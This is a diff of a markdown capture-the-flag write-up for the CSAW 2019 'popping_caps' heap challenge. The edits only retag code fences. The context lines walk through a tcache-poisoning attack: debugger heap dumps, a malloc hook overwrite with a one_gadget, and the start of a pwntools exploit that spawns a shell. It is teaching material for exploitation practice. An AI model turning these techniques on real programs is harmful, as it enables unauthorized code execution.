@@ -2,7 +2,7 @@
 
 Let's take a look at the binary and libc:
 
-```
+```console
 $ pwn checksec popping_caps
 [*] '/Hackery/pod/modules/44-more_tcache/csaw19_popping_caps1/popping_caps'
     Arch:     amd64-64-little
@@ -38,7 +38,7 @@ First off we are dealing with libc version `2.27` (so we get to use the tcache).
 
 When we take a look at the main function in Ghidra, we see this:
 
-```
+```c
 undefined8 main(void)
 
 {
@@ -105,7 +105,7 @@ So we can see a few things here. First we can allocate a chunk of a particular s
 
 Also one other important thing, we only get `7` actions (with an action being a read, write, or free). After that `bye` is run which the program calls `malloc` and `exit`:
 
-```
+```c
 void bye(void)
 
 {
@@ -120,7 +120,7 @@ void bye(void)
 
 So for exploiting this code, we will be attacking the tcache. Particularly where the tcache stores the beginning of the various linked lists that makes up the tcache, and the corresponding counts. This is stored in a chunk at the beginning of the heap. For a better understanding of this, let's take a look at it:
 
-```
+```gdb
 gef➤  vmmap
 Start              End                Offset             Perm Path
 0x000056054637b000 0x000056054637c000 0x0000000000000000 r-x /home/guyinatuxedo/Desktop/popping/popping_caps
@@ -195,7 +195,7 @@ gef➤  x/100g 0x0000560548324000
 
 So we can see the chunk we were talking about the beginning, with a size of `0x251`. We can also see another chunk we allocated at `0x560548324250` with the size `0x91`. Let's free it and have it inserted into the tcache:
 
-```
+```gdb
 gef➤  x/100g 0x0000560548324000
 0x560548324000: 0x0 0x251
 0x560548324010: 0x100000000000000 0x0
@@ -251,7 +251,7 @@ gef➤  x/100g 0x0000560548324000
 
 So we can see a pointer to the freed chunk (which is now in the tcache) ended up in the upper chunk. We also see the corresponding byte for that count of the linked list associated with chunks of that size has been incremented. So for how we will start off by allocating a chunk of size `0x3b0`:
 
-```
+```gdb
 gef➤  x/100g 0x0000560eee9a5000
 0x560eee9a5000: 0x0 0x251
 0x560eee9a5010: 0x0 0x0
@@ -307,7 +307,7 @@ gef➤  x/100g 0x0000560eee9a5000
 
 Proceeding that, we will free that chunk. This will insert a pointer to it as the head of the linked list for it's idx, and increment the corresponding count:
 
-```
+```gdb
 gef➤  x/100g 0x0000560eee9a5000
 0x560eee9a5000: 0x0 0x251
 0x560eee9a5010: 0x0 0x0
@@ -362,7 +362,7 @@ gef➤  x/100g 0x0000560eee9a5000
 ```
 
 As you can see, the `0x1` for the idx maps to the byte `0x560eee9a5049`. This also happens to make for a perfect fake chunk header with size `0x100`. Next we will free the fake chunk we just created, which will insert it into the tcache. Also the reason why we choose that spot, is the linked list pointers will begin at `0x560eee9a5050`, which we will be able to write to:
-```
+```gdb
 gef➤  x/100g 0x0000560eee9a5000
 0x560eee9a5000: 0x0 0x251
 0x560eee9a5010: 0x0 0x1000000000000
@@ -417,7 +417,7 @@ gef➤  x/100g 0x0000560eee9a5000
 ```
 
 As we can see here, the chunk `0x560eee9a5050` has been inserted into the tcache. Next we will allocate it with malloc:
-```
+```gdb
 gef➤  x/100g 0x0000560eee9a5000
 0x560eee9a5000: 0x0 0x251
 0x560eee9a5010: 0x0 0x0
@@ -473,7 +473,7 @@ gef➤  x/100g 0x0000560eee9a5000
 
 Now `ptrCopy` points to `0x560eee9a5050`. We will now write to it the address of the malloc hook, which we know from the libc base address:
 
-```
+```gdb
 gef➤  x/100g 0x0000560eee9a5000
 0x560eee9a5000: 0x0 0x251
 0x560eee9a5010: 0x0 0x0
@@ -531,7 +531,7 @@ gef➤  x/g 0x7f81fad74c30
 
 Now the head of the linked list for the smallest size idx points to the malloc hook. We will just allocate the chunk, and write to it the address of a oneshot gadget in the libc. Here is the value before the write:
 
-```
+```gdb
 ───────────────────────────────────────────────────────────────────── stack ────
 0x00007ffe039d1ce0│+0x0000: 0x00007f81fad8a9a0  →  <_dl_fini+0> push rbp   ← $rsp
 0x00007ffe039d1ce8│+0x0008: 0x0000000000000000
@@ -572,14 +572,14 @@ gef➤  x/g 0x00007f81fad74c30
 
 After the write:
 
-```
+```gdb
 gef➤  x/g 0x00007f81fad74c30
 0x7f81fad74c30 <__malloc_hook>: 0x00007f81faa9338c
 ```
 
 Also this is how we find the oneshot gadget:
 
-```
+```text
 one_gadget libc.so.6
 0x4f2c5 execve("/bin/sh", rsp+0x40, environ)
 constraints:
@@ -600,7 +600,7 @@ After that, our seven actions are called. The function `bye` is called which cal
 
 Putting it all together, we have the following exploit:
 
-```
+```python
 from pwn import *
 
 target = process('./popping_caps', env={"LD_PRELOAD":"./libc.so.6"})
@@ -667,7 +667,7 @@ target.interactive()
 ```
 
 When we run it:
-```
+```console
 $ python exploit.py
 [+] Starting local process './popping_caps': pid 3821
 [*] '/home/guyinatuxedo/Desktop/popping/libc.so.6'
